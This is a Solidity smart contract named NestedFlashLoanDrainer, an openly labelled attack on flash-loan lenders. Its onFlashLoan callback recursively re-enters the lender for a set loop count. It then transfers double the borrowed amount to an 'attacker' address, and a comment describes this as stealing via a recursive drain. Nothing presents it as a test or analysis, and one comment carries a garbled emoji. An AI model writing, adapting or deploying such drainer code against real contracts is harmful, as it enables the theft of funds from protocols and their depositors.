// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

interface IERC20 {
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

interface IFlashLender {
    function flashLoan(address receiver, address token, uint256 amount, bytes calldata data) external;
}

interface IFlashBorrower {
    function onFlashLoan(address initiator, address token, uint256 amount, uint256 fee, bytes calldata data) external returns (bytes32);
}

/// @title NestedFlashLoanDrainer - Uses reentrant flash loan callback for draining
contract NestedFlashLoanDrainer is IFlashBorrower {
    IFlashLender public lender;
    address public attacker;
    uint256 public loopCount;

    constructor(address _lender, address _attacker, uint256 _loops) {
        lender = IFlashLender(_lender);
        attacker = _attacker;
        loopCount = _loops;
    }

    function start(address token, uint256 amount) external {
        lender.flashLoan(address(this), token, amount, "init");
    }

    function onFlashLoan(address initiator, address token, uint256 amount, uint256, bytes calldata data) external override returns (bytes32) {
        if (loopCount > 0) {
            loopCount--;
            lender.flashLoan(address(this), token, amount, "nested");
        } else {
            IERC20(token).transfer(attacker, amount * 2); // ðŸ’¸ steals double via recursive drain
        }
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
